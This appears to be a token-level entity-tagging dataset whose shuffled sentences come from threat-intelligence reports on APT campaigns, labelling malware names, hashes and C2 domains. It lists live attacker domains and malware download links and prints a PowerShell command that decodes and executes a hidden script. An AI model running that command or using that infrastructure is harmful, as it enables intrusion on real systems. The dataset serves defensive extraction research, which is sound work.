idf.blogsite.org	B-url.cncsvr

root9B	O
discovered	O
and	O
analyzed	O
numerous	O
other	O
domains	O
being	O
staged	O
or	O
recently	O
created	O
for	O
the	O
malicious	O
cyber	O
operation	O
.	O

On	O
the	O
other	O
hand	O
,	O
this	O
Chinese	O
conglomerate	O
designs	O
and	O
manufactures	O
aerospace	O
and	O
air	O
defense	O
technologies	O
,	O
among	O
many	O
other	O
enterprises	O
.	O

The	O
config	O
files	O
have	O
a	O
similar	O
,	O
custom	O
structure	O
,	O
and	O
both	O
groups	O
have	O
infrastructure	O
overlap	O
.	O

Israeli	O
baits	O
:	O

The	O
fi	O
rst	O
bat	O
script	O
to	O
run	O
is	O
'	O
up.bat	O
'	O
and	O
is	O
set	O
in	O
the	O
'	O
RunProgram	O
'	O
variable	O
.	O

Reflective	O
Loader	O

1	O
.	O

Even	O
though	O
attackers	O
tried	O
to	O
make	O
it	O
look	O
like	O
the	O
spear	O
phishing	O
email	O
was	O
sent	O
by	O
an	O
email	O
id	O
associated	O
with	O
Hidrofersa	O
but	O
inspecting	O
the	O
email	O
headers	O
revealed	O
some	O
interesting	O
information	O
.	O

This	O
company	O
has	O
4	O
other	O
offices	O
in	O
Pakistan	O
(	O
Lahore	O
,	O
Islamabad	O
,	O
Sialkot	O
,	O
Faisalabad	O
)	O
.	O

'	O
Operation	O
Pawn	O
Storm	O
:	O
Using	O
Decoys	O
to	O
Evade	O
Detection	O
.	O
'	O

As	O
such	O
,	O
this	O
TTP	O
of	O
obfuscated/encrypted	O
HTML	O
comments	O
has	O
been	O
also	O
widely	O
reported	O
in	O
the	O
media	O
as	O
associated	O
with	O
the	O
nation	O
state	O
group	O
called	O
'	O
Comment	O
Group	O
'	O
or	O
'	O
Comment	O
Team	O
,	O
'	O
which	O
is	O
believed	O
to	O
be	O
associated	O
with	O
the	O
Chinese	O
government	O
.	O

Figure	O
8	O
.	O

The	O
last	O
version	O
observed	O
was	O
version	O
6	O
(	O
Xagent6.exe	O
)	O
.	O

Sublist3r	O
—	O
a	O
tool	O
written	O
in	O
Python	O
designed	O
to	O
enumerate	O
website	O
subdomains	O
.	O

5	O
.	O

Figure	O
2	O
:	O
APT12	O
Spearphishing	O
Email	O

The	O
newer	O
versions	O
of	O
Mutter	B-malware.backdoor
have	O
a	O
very	O
similar	O
HTTP	O
request	O
,	O
but	O
with	O
the	O
and	O
headers	O
swapped	O
.	O

Several	O
files	O
have	O
been	O
uploaded	O
to	O
malware	O
databases	O
which	O
appear	O
to	O
be	O
related	O
to	O
this	O
attack	O
,	O
including	O
an	O
archive	O
titled	O
1/10	O
'	O
FEIB_Samples	O
'	O
submitted	O
from	O
Taiwan	O
on	O
12th	O
Oct	O
2017	O
.	O

We	O
also	O
observed	O
the	O
use	O
of	O
another	O
custom	O
backdoor	O
called	O
Sysget/HelloBridge	B-malware.backdoor
by	O
one	O
of	O
the	O
attack	O
groups	O
,	O
which	O
we	O
believe	O
is	O
possibly	O
shared	O
between	O
the	O
campaigns	O
as	O
well	O
.	O

APT32	B-malware.infosteal
actors	O
continue	O
to	O
deliver	O
the	O
malicious	O
attachments	O
via	O
spear-phishing	O
emails	O
.	O

However	O
,	O
instead	O
of	O
removing	O
it	O
,	O
we	O
can	O
simple	O
rename	O
the	O
path	O
to	O
the	O
executable	O
in	O
order	O
to	O
switch	O
off	O
the	O
persistence	O
mechanism	O
.	O

The	O
attackers	O
used	O
the	O
famous	O
Mimikatz	B-malware.unknown
credential	O
dumping	O
tool	O
as	O
their	O
main	O
tool	O
to	O
obtain	O
credentials	O
including	O
user	O
passwords	O
,	O
NTLM	O
hashes	O
and	O
Kerberos	O
tickets	O
.	O

This	O
is	O
shown	O
in	O
the	O
above	O
code	O
.	O

The	O
role	O
of	O
NTWDBLIB.dll	O
is	O
to	O
restart	O
the	O
system	O
service	O
WSearch	O
,	O
and	O
then	O
start	O
msfte.dll	O
.	O

Effectively	O
,	O
an	O
attacker	O
can	O
form	O
a	O
request	O
that	O
will	O
execute	O
any	O
VBScript	O
code	O
.	O

As	O
we	O
have	O
mentioned	O
in	O
a	O
number	O
of	O
our	O
other	O
reports	O
,	O
attackers	O
often	O
use	O
C	O
&	O
C	O
domains	O
which	O
contain	O
phrases	O
relevant	O
to	O
their	O
targets	O
so	O
as	O
to	O
make	O
them	O
appear	O
legitimate	O
.	O

The	O
technical	O
evidence	O
discussed	O
below	O
,	O
we	O
believe	O
points	O
instead	O
to	O
an	O
Indian	O
company	O
:	O
Appin	O
.	O

Cyberkov	O
created	O
a	O
fake	O
server	O
simulating	O
the	O
real	O
C2	O
of	O
the	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
hacking	O
group	O
and	O
sinkholed	O
the	O
malware	O
to	O
study	O
the	O
behavior	O
of	O
the	O
malware	O
deeply	O
.	O

1.exe	O
New.exe	O
Folder.exe	O
log	O
file.exe	O
https://drive.google[.]com/uc?export=download&id=0B7n	B-url.unknown
4BFDObRocdm1uS2J4SWVUNWc	I-url.unknown
http://drive.google[.]com/uc?export=download&id=0ByjYV	B-url.unknown
MTYJB0saHlTalJ6ZWlWWGM	I-url.unknown
support.mafy-koren[.]online/reg-update	O
support.mafy-koren[.]online/UFeed.php	O
Israel	O
's	O
Cellebrite	O
linked	O
to	O
FBI	O
's	O
iPhone	O
hack	O
attempt.exe	O
Report-Photos.rar	O
Analysis--Hezbollah.rar	O
Report.rar	O
Logs.exe	O

In	O
the	O
time	O
between	O
deployment	O
of	O
a	O
zero-day	O
and	O
its	O
eventual	O
discovery	O
and	O
eradication	O
,	O
corporations	O
can	O
suffer	O
enormous	O
losses	O
without	O
even	O
realizing	O
that	O
the	O
threat	O
was	O
ever	O
there	O
.	O

LEGAL	O
NOTICE	O
&	O
DISCLAIMER	O
:	O

The	O
vulnerability	O
(	O
CVE-2016-4171	O
)	O
is	O
located	O
in	O
the	O
code	O
which	O
parses	O
the	O
ExecPolicy	O
metadata	O
information	O
.	O

EBC9BDF9FDF0A9773899D96D24AC46F4	B-hash
powerhost.zapto.org	B-url.cncsvr

The	O
emails	O
ostensibly	O
pertained	O
to	O
the	O
ongoing	O
turmoil	O
in	O
Bahrain	O
,	O
and	O
encouraged	O
recipients	O
to	O
open	O
a	O
series	O
of	O
suspicious	O
attachments	O
.	O

The	O
encryption	O
of	O
the	O
payload	O
,	O
together	O
with	O
the	O
side-loading	O
technique	O
–	O
despite	O
its	O
age	O
–	O
is	O
a	O
good	O
way	O
to	O
stay	O
under	O
the	O
radar	O
,	O
since	O
the	O
malicious	O
activities	O
look	O
like	O
they	O
come	O
from	O
the	O
legitimate	O
application	O
.	O

T	O
he	O
most	O
unusual	O
and	O
interesting	O
point	O
here	O
is	O
the	O
target	O
.	O

Logging	O
Practices	O

Looking	O
Back	O
While	O
the	O
APT	O
has	O
gone	O
through	O
significant	O
upgrades	O
over	O
the	O
past	O
year	O
,	O
the	O
conductors	O
of	O
these	O
campaigns	O
maintained	O
evident	O
fingerprints	O
,	O
both	O
in	O
the	O
delivery	O
methods	O
and	O
malware	O
development	O
conventions	O
.	O

ORIGIN/THREAT	O
ACTOR	O
ATTRIBUTION	O
:	O
The	O
term	O
'	O
Beebus	B-malware.infosteal
'	O
was	O
coined	O
from	O
an	O
initial	O
sample	O
in	O
this	O
campaign	O
(	O
MD5	O
:	O
7ed557921ac60dfcb295ebabfd972301	B-hash
)	O
,	O
which	O
was	O
originally	O
submitted	O
to	O
VirusTotal	O
on	O
April	O
12	O
,	O
2011	O
.	O

From	O
this	O
,	O
the	O
author	O
of	O
the	O
source	O
code	O
was	O
determined	O
to	O
be	O
XXXXXXXX	O
.	O

The	O
exact	O
number	O
of	O
the	O
victims	O
may	O
actually	O
vary	O
.	O

The	O
attackers	O
had	O
to	O
make	O
sure	O
that	O
they	O
remained	O
undetected	O
so	O
the	O
backdoors	O
were	O
designed	O
to	O
be	O
as	O
stealthy	O
as	O
possible	O
.	O

The	O
main	O
function	O
performed	O
by	O
the	O
SCT	O
file	O
is	O
to	O
Base64	O
decode	O
the	O
contents	O
of	O
WindowsDefender.ini	O
file	O
and	O
execute	O
the	O
decoded	O
PowerShell	O
Script	O
using	O
the	O
following	O
command	O
line	O
:	O
powershell.exe	O
-exec	O
Bypass	O
-c	O
iex	O
(	O
[	O
System.Text.Encoding	O
]	O
:	O
:Unicode.GetString	O
(	O
[	O
System.Convert	O
]	O
:	O
:FromBase64String	O
(	O
(	O
get-content	O
C	O
:	O
\\ProgramData\\WindowsDefender.ini	O
)	O
The	O
rest	O
of	O
the	O
malicious	O
activities	O
are	O
performed	O
by	O
the	O
PowerShell	O
Script	O
.	O

gserv.mobi	O
2015-04-28	O
2020-04-01	O
network-lab.info	O
2016-03-29	O
2026-03-27	O
onlineclub.info	O
2017-05-24	O
2027-05-22	O
00fe4b81ee781fe	O
0090400fbd572e	O
dcc6	O
00e7238783cc4e	O
87de	O
free-apps.us	O
2017-08-24	O
2035-11-08	O
00b6965aa72d97	O
446d	O

There	O
were	O
,	O
however	O
,	O
many	O
similarities	O
between	O
the	O
samples	O
we	O
found	O
and	O
the	O
ones	O
which	O
were	O
found	O
during	O
the	O
2017	O
campaign	O
,	O
such	O
as	O
the	O
usage	O
of	O
actor	O
and	O
character	O
names	O
from	O
renowned	O
TV	O
series	O
,	O
as	O
well	O
as	O
fingerprinting	O
the	O
system	O
and	O
sending	O
the	O
information	O
to	O
the	O
C	O
&	O
C	O
.	O

oor	O
:	O
Opera	O
tion	O
Beeb	O
us	O
with	O
Ne	O
w	O
Ta	O
r	O
...	O

Mi17	O
Technical	O
issues	O
-	O
Phonesack	O
Grp.exe	O

The	O
SIS	O
threat	O
model	O
below	O
highlights	O
some	O
of	O
the	O
options	O
available	O
to	O
an	O
attacker	O
who	O
has	O
successfully	O
compromised	O
an	O
SIS	O
.	O

T	O
he	O
operators	O
used	O
the	O
HyperBro	B-malware.backdoor
T	O
rojan	O
as	O
their	O
last-stage	O
in-memory	O
remote	O
administration	O
tool	O
(	O
RAT	O
)	O
.	O

The	O
email	O
's	O
body	O
reveals	O
a	O
business-related	O
topic	O
:	O
an	O
offer	O
to	O
become	O
member	O
of	O
this	O
year	O
's	O
International	O
Trade	O
Council	O
.	O

These	O
documents	O
appear	O
to	O
be	O
part	O
of	O
the	O
same	O
campaign	O
and	O
may	O
have	O
been	O
used	O
on	O
different	O
targets	O
.	O

None	O
of	O
the	O
Bandook	B-malware.unknown
samples	O
we	O
have	O
found	O
in	O
this	O
campaign	O
have	O
been	O
configured	O
so	O
as	O
to	O
execute	O
an	O
actual	O
decoy	O
document	O
.	O

The	O
encryption	O
is	O
done	O
using	O
the	O
RSA-2048	O
and	O
AES-256	O
algorithms	O
.	O

The	O
malware	O
author	O
replaced	O
all	O
the	O
entries	O
of	O
'	O
Teamviewer	O
'	O
strings	O
in	O
Team	O
Viewer	O
components	O
.	O

It	O
detects	O
behavioral	O
patterns	O
across	O
every	O
endpoint	O
and	O
surfaces	O
malicious	O
operations	O
in	O
an	O
exceptionally	O
user-friendly	O
interface	O
.	O

Malicious	O
websites	O
may	O
look	O
identical	O
to	O
a	O
legitimate	O
site	O
,	O
but	O
the	O
URL	O
often	O
includes	O
a	O
variation	O
in	O
spelling	O
or	O
a	O
different	O
domain	O
than	O
the	O
valid	O
website	O
(	O
e.g.,.com	O
vs	O
.	O

Function	O
PreProcess_sub_44C1C0	O
(	O
)	O

The	O
data	O
package	O
is	O
heartbeat	O
.	O

Later	O
on	O
,	O
we	O
will	O
come	O
to	O
a	O
function	O
where	O
such	O
a	O
string	O
could	O
be	O
pertinent	O
but	O
the	O
malware	O
is	O
not	O
able	O
to	O
find	O
this	O
data	O
in	O
the	O
place	O
where	O
it	O
should	O
be	O
.	O

Roarur.dr	O
Trojan	O

FF8E19CA8A224CC843BF0F2F74A3274E	B-hash
powerhost.zapto.org	B-url.cncsvr

The	O
decryption	O
to	O
above	O
IP	O
,	O
domains	O
and	O
accessing	O
addresses	O
is	O
'	O
XOR	O
0x69	O
'	O
.	O

binary	O
with	O
original	O
After	O
some	O
initialization	O
,	O
Bandook	B-malware.unknown
performs	O
an	O
initial	O
beacon	O
with	O
the	O
general	O
information	O
and	O
configuration	O
details	O
it	O
previously	O
collected	O
.	O

Minimize	O
the	O
use	O
of	O
these	O
services	O
where	O
possible	O
or	O
consider	O
more	O
secure	O
alternatives	O
.	O

Ch	O
2.14.1	O
:	O
5121ce1f96d74076df1c39748e019f42	B-hash
Ch	O
3.00	O
:	O
28dc1ca683d6a14d0d1794a68c477604	B-hash
Code	O
similarity	O
:	O
60	O
%	O
These	O
codes	O
really	O
differ	O
from	O
each	O
other	O
,	O
even	O
if	O
some	O
parts	O
of	O
version	O
2.14.1	O
were	O
retained	O
.	O

This	O
would	O
have	O
hampered	O
the	O
detection	O
and	O
response	O
to	O
the	O
attack	O
,	O
giving	O
more	O
time	O
for	O
the	O
subsequent	O
money	O
laundering	O
to	O
take	O
place	O
.	O

We	O
recommend	O
organisations	O
use	O
the	O
indicators	O
provided	O
in	O
Appendix	O
A	O
to	O
update	O
their	O
defensive	O
systems	O
to	O
identify	O
attacks	O
.	O

The	O
malware	O
collects	O
host	O
information	O
,	O
base64	O
encodes	O
it	O
,	O
and	O
sends	O
it	O
to	O
two	O
C2	O
servers	O
.	O

Once	O
the	O
sample	O
is	O
able	O
to	O
reach	O
the	O
main	O
C	O
&	O
C	O
,	O
the	O
first	O
thing	O
it	O
does	O
is	O
fingerprint	O
the	O
system	O
(	O
user	O
and	O
PC	O
names	O
,	O
OS	O
version	O
and	O
AntiVirus	O
engines	O
)	O
,	O
and	O
exfiltrate	O
the	O
gathered	O
information	O
.	O

SHELLCODE	O
ARTIFACTS	O

Pay	O
attention	O
to	O
the	O
URL	O
of	O
a	O
website	O
.	O

These	O
steps	O
are	O
taken	O
only	O
if	O
it	O
's	O
running	O
on	O
an	O
infected	O
system	O
for	O
the	O
first	O
time	O
.	O

from	O
the	O
C2	O
response	O
)	O
.	O

This	O
would	O
not	O
be	O
the	O
first	O
time	O
the	O
Lazarus	O
Group	O
used	O
foreign-language	O
terms	O
to	O
misdirect	O
attribution	O
efforts	O
;	O
BAE	O
researchers	O
discovered	O
transliterated	O
Russian	O
terms	O
in	O
previous	O
Lazarus	O
operations	O
.	O

Every	O
form	O
is	O
used	O
:	O
JZ/JNZ	O
,	O
JP/JNP	O
,	O
JO/JNO	O
,	O
etc	O
,	O
each	O
pair	O
jumping	O
to	O
the	O
same	O
target	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
md5	O
hashes	O
of	O
the	O
samples	O
that	O
is	O
associated	O
with	O
the	O
C2	O
domain	O
.	O

These	O
files	O
seem	O
to	O
be	O
a	O
classic	O
img	O
and	O
a	O
link	O
,	O
but	O
actually	O
the	O
jpg	O
file	O
is	O
the	O
executable	O
of	O
the	O
second	O
sample	O
and	O
in	O
the	O
link	O
file	O
is	O
hidden	O
the	O
following	O
command	O
:	O

16DXntec15nXnSDXp9eo15HXmded	O

For	O
example	O
,	O
the	O
initial	O
ANEL	B-malware.backdoor
version	O
,	O
'	O
5.0.0	O
beta1	O
,	O
'	O
uses	O
a	O
different	O
C	O
&	O
C	O
server	O
compared	O
to	O
the	O
other	O
versions	O
.	O

Hashes	O
detected	O
as	O
BKDR_RATANKBA.ZAEL-A	O
1768f2e9cea5f8c97007c6f822531c1c9043c151187c54ebfb289980ff63d666	B-hash
6cac0be2120be7b3592fe4e1f7c86f4abc7b168d058e07dc8975bf1eafd7cb25	B-hash
d844777dcafcde8622b9472b6cd442c50c3747579868a53a505ef2f5a4f0e26a	B-hash
db8163d054a35522d0dec35743cfd2c9872e0eb446467b573a79f84d61761471	B-hash
f7f2dd674532056c0d67ef1fb7c8ae8dd0484768604b551ee9b6c4405008fe6b	B-hash
Hashes	O
detected	O
as	O
CHM_DLOADER.ZCEL-A	O
01b047e0f3b49f8ab6ebf6795bc72ba7f63d7acbc68f65f1f8f66e34de827e49	B-hash
030b4525558f2c411f972d91b144870b388380b59372e1798926cc2958242863	B-hash
10cbb5d0974af08b5d4aa9c753e274a81348da9f8bfcaa5193fad08b79650cda	B-hash
650d7b814922b58b6580041cb0aa9d27dae7e94e6d899bbb3b4aa5f1047fca0f	B-hash
6cb1e9850dd853880bbaf68ea23243bac9c430df576fa1e679d7f26d56785984	B-hash
6d4415a2cbedc960c7c7055626c61842b3a3ca4718e2ac0e3d2ac0c7ef41b84d	B-hash
772b9b873100375c9696d87724f8efa2c8c1484853d40b52c6dc6f7759f5db01	B-hash
9d10911a7bbf26f58b5e39342540761885422b878617f864bfdb16195b7cd0f5	B-hash
d5f9a81df5061c69be9c0ed55fba7d796e1a8ebab7c609ae437c574bd7b30b48	B-hash
Hashes	O
detected	O
as	O
JS_DLOADER.ZBEL-A	O
8ff100ca86cb62117f1290e71d5f9c0519661d6c955d9fcfb71f0bbdf75b51b3	B-hash
Hashes	O
detected	O
as	O
X97M_DLOADR.ZBEL-A	O
972b598d709b66b35900dc21c5225e5f0d474f241fefa890b381089afd7d44ee	B-hash
Hashes	O
detected	O
as	O
VBS_DLOADR.ZAEL-A	O
4722138dda262a2dca5cbf9acd40f150759c006f56b7637769282dba54de0cab	B-hash

Specifically	O
,	O
the	O
malware	O
encrypts	O
only	O
the	O
first	O
1MB	O
of	O
data	O
and	O
it	O
does	O
not	O
write	O
any	O
header	O
or	O
footer	O
,	O
only	O
raw	O
encrypted	O
data	O
and	O
does	O
not	O
rename	O
encrypted	O
files	O
,	O
so	O
it	O
's	O
hard	O
to	O
say	O
which	O
files	O
are	O
encrypted	O
and	O
which	O
are	O
not	O
.	O

Dino	B-malware.backdoor
's	O
hash	O
is	O
a	O
one­byte	O
value	O
calculated	O
with	O
a	O
series	O
of	O
XOR	O
operations	O
on	O
the	O
key	O
,	O
and	O
each	O
bucket	O
starts	O
a	O
linked	O
list	O
containing	O
key/value	O
pairs	O
.	O

'	O
Recording	O
and	O
Playing	O
Sound	O
with	O
the	O
Waveform	O
Audio	O
Interface	O
.	O
'	O

As	O
you	O
might	O
imagine	O
,	O
this	O
is	O
a	O
powerful	O
capability	O
.	O

The	O
binaries	O
at	O
hand	O
fit	O
well	O
with	O
the	O
description	O
CSEC	O
provides	O
,	O
although	O
it	O
is	O
quite	O
clear	O
they	O
are	O
a	O
newer	O
version	O
from	O
what	O
CSEC	O
had	O
uncovered	O
around	O
2009	O
.	O

The	O
G	O
DATA	O
security	O
solutions	O
detect	O
the	O
malicious	O
document	O
(	O
08E834B6D4123F0AEA27D042FCEAF992	B-hash
)	O
as	O
Exploit.CVE-2012-0158.AH	O
and	O
G	O
DATA	O
's	O
proactive	O
Exploit	O
Protection	O
technology	O
also	O
prevents	O
the	O
attack	O
before	O
the	O
PC	O
can	O
be	O
infected	O
.	O

This	O
piece	O
of	O
code	O
supports	O
detecting	O
Cuckoo	O
Sandbox	O
,	O
VMWare	O
product	O
&	O
Oracle	O
's	O
VirtualBox	O
.	O

Introduction	O
...........................................................................................................................................	O
4	O
Campaigns	O
Observed	O
in	O
2Q	O
................................................................................................................	O
5	O
Targeted	O
Attack	O
Campaigns	O
Profiling	O
..................................................................................	O
5	O
Affected	O
Industry	O
Sectors	O
.......................................................................................................	O
6	O
Affected	O
Regions	O
......................................................................................................................	O
6	O
Attachments	O
Used	O
In	O
Targeted	O
Attacks	O
................................................................................	O
7	O
C	O
&	O
C	O
Statistics	O
...........................................................................................................................	O
7	O
Feature	O
:	O
EvilGrab	B-malware.drop
Campaign	O
Targets	O
Diplomatic	O
Agencies	O
..........................................................	O
8	O
Targets	O
........................................................................................................................................	O
8	O
Attack	O
Vectors	O
...........................................................................................................................	O
9	O
Exploits	B-malware.backdoor
,	O
Payloads	B-malware.backdoor
,	O
and	O
Decoy	B-malware.backdoor
Documents	I-malware.backdoor
..........................................................................	O
9	O
DLL	B-malware.backdoor
Preloading	I-malware.backdoor
Using	O
the	O
Windows	O
Shell	O
and	O
Fax	O
Server	O
...............................................	O
9	O
Other	O
Autorun	B-malware.drop
Behaviors	O
.....................................................................................................	O
10	O
Stealth	O
Operation	O
....................................................................................................................	O
10	O
Registry	O
Storage	O
......................................................................................................................	O
11	O
Media	O
Grabbing	O
......................................................................................................................	O
11	O
User	O
Credential	O
Theft	O
............................................................................................................	O
11	O
Tencent	B-malware.drop
QQ	I-malware.drop
Memory	O
Reading	O
:	O
............................................................................................	O
13	O
Key	O
Logging	O
............................................................................................................................	O
13	O
Command	O
&	O
Control	O
Servers	O
...............................................................................................	O
14	O
Backdoor	B-malware.backdoor
Activity	I-malware.backdoor
...................................................................................................................	O
15	O
Trend	O
Micro	O
Recommendations	O
.......................................................................................................	O
21	O
References	O
............................................................................................................................................	O
22	O

The	O
dialog	O
box	O
is	O
well	O
designed	O
and	O
appears	O
to	O
be	O
an	O
authentic	O
Microsoft	O
Office	O
message	O
.	O

Note	O
:	O
the	O
three	O
character	O
prefi	O
xes	O
Ups	O
and	O
RaS	O
can	O
easily	O
be	O
modifi	O
ed	O
by	O
the	O
attacker	O
.	O

This	O
file	O
contains	O
one	O
export	O
function	O
—	O
either	O
'	O
crt_main	O
'	O
or	O
'	O
lena_main	O
'	O

After	O
deobfuscating	O
the	O
contents	O
of	O
the	O
PowerShell	O
Script	O
,	O
we	O
can	O
divide	O
it	O
into	O
three	O
sections	O
.	O

If	O
Version	O
==	O
Windows	O
XP	O
then	O
just	O
invoke	O
'	O
Launch	O
'	O
export	O
of	O
Iron	O
Backdoor	O
for	O
a	O
one-time	O
non	O
persistent	O
execution..	O

The	O
inclusion	O
of	O
Portuguese	O
language	O
strings	O
and	O
preference	O
for	O
Portuguese	O
systems	O
is	O
prominent	O
throughout	O
the	O
samples	O
.	O

This	O
helps	O
obfuscate	O
the	O
file	O
so	O
that	O
it	O
will	O
not	O
be	O
detected	O
by	O
anti-virus	O
systems	O
.	O

[	O
그림	O
4	O
]	O
감염	O
시스템에	O
생성되는	O
스크립트	O
파일	O
이때	O
윈도우	O
실행	O
파일을	O
의미하는	O
MZ	O
문자열이	O
존재하지	O
않으며	O
,	O
로컬에서	O
MZ로	O
시작하는	O
문자열을	O
추	O
가해	O
실행	O
파일을	O
만든다	O
.	O

Win32/Spy.Agent.ORM	B-malware.infosteal
–	O
overview	O

APT19	B-malware.infosteal
leveraged	O
Rich	O
Text	O
Format	O
(	O
RTF	O
)	O
and	O
macro-enabled	O
Microsoft	O
Excel	O
(	O
XLSM	O
)	O
files	O
to	O
deliver	O
their	O
initial	O
exploits	O
.	O

If	O
the	O
user	O
clicks	O
on	O
the	O
'	O
No	O
'	O
button	O
,	O
malicious	O
activity	O
will	O
not	O
initiate	O
.	O

AES	O
is	O
the	O
encryption	O
algorithm	O
of	O
choice	O
throughout	O
the	O
dropper	O
and	O
its	O
implant	O
's	O
operations	O
.	O

When	O
successfully	O
executed	O
,	O
the	O
malicious	O
documents	O
install	O
a	O
backdoor	O
we	O
track	O
as	O
POWERSTATS	O
.	O

I	O
used	O
sample	O
for	O
testing	O
,	O
which	O
was	O
executed	O
by	O
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197	B-hash
during	O
analysis	O
on	O
Windows	O
XP	O
.	O

ETHIOPIA	O
AND	O
VIETNAM	O
:	O
IN-DEPTH	O
DISCUSSION	O
OF	O
NEW	O
SAMPLES	O
3.1	O
FinSpy	B-malware.backdoor
in	O
Ethiopia	O

Selections	O
of	O
actors	O
share	O
some	O
resources	O
,	O
as	O
per	O
previous	O
observations	O
with	O
similar	O
kits	O
by	O
some	O
security	O
vendors	O
.	O

On	O
2003	O
systems	O
the	O
boot	O
backup	O
is	O
sometimes	O
found	O
halfway	O
through	O
the	O
partition	O
,	O
a	O
manual	O
parsing	O
of	O
the	O
file	O
will	O
need	O
to	O
be	O
performed	O
to	O
confirm	O
the	O
VBR	O
is	O
legitimate	O
for	O
the	O
partition	O
.	O

This	O
purpose	O
of	O
this	O
blog	O
post	O
is	O
to	O
inform	O
law	O
firms	O
and	O
investment	O
firms	O
of	O
this	O
phishing	O
campaign	O
and	O
provide	O
technical	O
indicators	O
that	O
their	O
IT	O
personnel	O
can	O
use	O
for	O
proactive	O
hunting	O
and	O
detection	O
.	O

Additionally	O
,	O
a	O
study	O
provided	O
by	O
the	O
International	O
Institute	O
of	O
Strategic	O
Studies	O
determined	O
that	O
the	O
weapons	O
platform	O
bearing	O
the	O
highest	O
losses	O
between	O
2013	O
and	O
2016	O
was	O
the	O
D-30	O
towed	O
howitzer	O
.	O

The	O
Korea	O
Internet	O
Security	O
Agency	O
(	O
KISA	O
)	O
reported	O
that	O
about	O
48,000	O
computers	O
were	O
affected	O
making	O
services	O
inaccessible	O
and	O
the	O
victim	O
organizations	O
needed	O
weeks	O
to	O
fully	O
restore	O
all	O
functions.In	O
terms	O
of	O
impact	O
,	O
the	O
attackers	O
managed	O
to	O
successfully	O
penetrate	O
the	O
target	O
networks	O
,	O
pivot	O
their	O
way	O
into	O
critical	O
assets	O
,	O
wipe	O
out	O
systems	O
,	O
cause	O
denial	O
of	O
services	O
,	O
and	O
trigger	O
enough	O
public	O
response	O
to	O
spur	O
the	O
media	O
into	O
using	O
terminology	O
such	O
as	O
cyber	O
terror	O
and	O
advanced	O
persistent	O
threats	O
.	O

The	O
presence	O
of	O
the	O
following	O
,	O
specifically	O
on	O
removable	O
media	O
,	O
may	O
indicate	O
netsat.exe	B-malware.infosteal
,	O
et	O
al	O
,	O
involvement	O
:	O
Autorun.inf	B-malware.backdoor
file	O
containing	O
the	O
file	O
name	O
setup35.exe	B-malware.backdoor
or	O
possibly	O
setup23.exe	O
RECYCLER\RECYCLED\SYS	O
RECYCLED\RECYCLED\SYS	O
RECYCLED\RECYCLED\SYS\desktop.ini	O
(	O
Wo	O
n't	O
be	O
visible	O
via	O
GUI	O
)	O
RECYCLER\RECYCLED\SYS\desktop.ini	O
(	O
Wo	O
n't	O
be	O
visible	O
via	O
GUI	O
)	O
~disk.ini	B-malware.backdoor
Cursory	O
analysis	O
did	O
not	O
disclose	O
entrenchment	O
data	O
,	O
such	O
as	O
a	O
Registry	O
entry	O
to	O
ensure	O
persistence	O
.	O

Cobalt	O
Strike2.4	O
Adding	O
time	O
stamp	O
to	O
view	O
-	O
>	O
web	O
log	O
;	O
regenerating	O
new	O
default	O
Beacon	O
HTTPS	O
certification	O
with	O
different	O
parameters	O
;	O
then	O
generating	O
C2	O
HTTPS	O
certification	O
;	O
updating	O
executable	O
files	O
and	O
default	O
tool	O
kit	O
of	O
DLLS	O
.	O

6/10	O

On	O
August	O
25	O
,	O
2014	O
,	O
we	O
observed	O
another	O
round	O
of	O
spear	O
phishing	O
emails	O
targeting	O
a	O
high-technology	O
company	O
in	O
Japan	O
.	O

They	O
could	O
have	O
also	O
been	O
performing	O
exercises	O
in	O
preparation	O
for	O
an	O
attack	O
against	O
similar	O
targets	O
.	O

There	O
are	O
multiple	O
reasons	O
why	O
this	O
campaign	O
is	O
extraordinary	O
in	O
its	O
execution	O
and	O
logistics	O
.	O

The	O
initial	O
PowerShell	O
script	O
.	O

We	O
were	O
unable	O
to	O
find	O
any	O
information	O
about	O
this	O
URL	O
in	O
public	O
data	O
sources	O
.	O

Figure	O
4	O
:	O
Identified	O
exploit	O
documents	O
for	O
HIGHTIDE	B-malware.backdoor

The	O
IP	O
200.63.46.33	B-ip.unknown
was	O
hosting	O
the	O
following	O
domains	O
:	O

There	O
are	O
two	O
forms	O
of	O
encrypted	O
strings	O
:	O
an	O
RSA256-encrypted	O
string	O
,	O
and	O
custom	O
base64-encoded	O
and	O
RSA256-encrypted	O
string	O
.	O

Below	O
screen	O
shot	O
shows	O
doc6.exe	O
running	O
from	O
the	O
%	O
TEMP	O
%	O
directory	O
The	O
dropped	O
file	O
(	O
doc6.exe	O
)	O
was	O
determined	O
as	O
KeyBase	B-malware.infosteal
malware	O
.	O

the	O
Further	O
investigation	O
into	O
this	O
campaign	O
and	O
analysis	O
of	O
McAfee	O
product	O
telemetry	O
shows	O
that	O
the	O
infection	O
occurred	O
on	O
March	O
2	O
and	O
3	O
.	O

There	O
are	O
several	O
options	O
for	O
how	O
this	O
attack	O
can	O
be	O
implemented	O
.	O

Fake	O
DLL	O
:	O
msfte.dll	O
(	O
638b7b0536217c8923e856f4138d9caff7eb309d	B-hash
)	O

31	O
)	O
which	O
was	O
first	O
mainly	O
focused	O
on	O
Palestinian	O
targets	O
,	O
then	O
shifted	O
towards	O
Israel	O
.	O

It	O
is	O
not	O
accidental	O
that	O
the	O
malware	O
author	O
has	O
singled	O
out	O
AhnLab	O
's	O
security	O
product	O
.	O

Performs	O
an	O
operation	O
(	O
decryption	O
perhaps	O
?	O
)	O

The	O
batch	O
script	O
executes	O
the	O
Mimikatz	B-malware.unknown
binary	I-malware.unknown
.	O

I	O
would	O
like	O
to	O
thank	O
Brian	O
Rogalski	O
who	O
after	O
reading	O
my	O
previous	O
blog	O
post	O
shared	O
a	O
malicious	O
document	O
which	O
he	O
thought	O
was	O
similar	O
to	O
the	O
document	O
mentioned	O
in	O
my	O
previous	O
blog	O
.	O

Leading	O
up	O
to	O
summer	O
2017	O
,	O
infrastructure	O
mostly	O
was	O
created	O
with	O
PDR	O
and	O
Internet	O
Domain	O
Service	O
BS	O
Corp	O
,	O
and	O
their	O
resellers	O
.	O

Web	O
.	O

As	O
analysts	O
passively	O
monitored	O
CARBON2U.COM	B-url.cncsvr
,	O
they	O
observed	O
as	O
the	O
apparent	O
fake	O
domains	O
they	O
were	O
monitoring	O
migrated	O
to	O
other	O
servers	O
;	O
first	O
to	O
SITE4NOW.NET	B-url.unknown
and	O
later	O
to	O
OK2HOST.COM	B-url.unknown
.	O

Technology	O
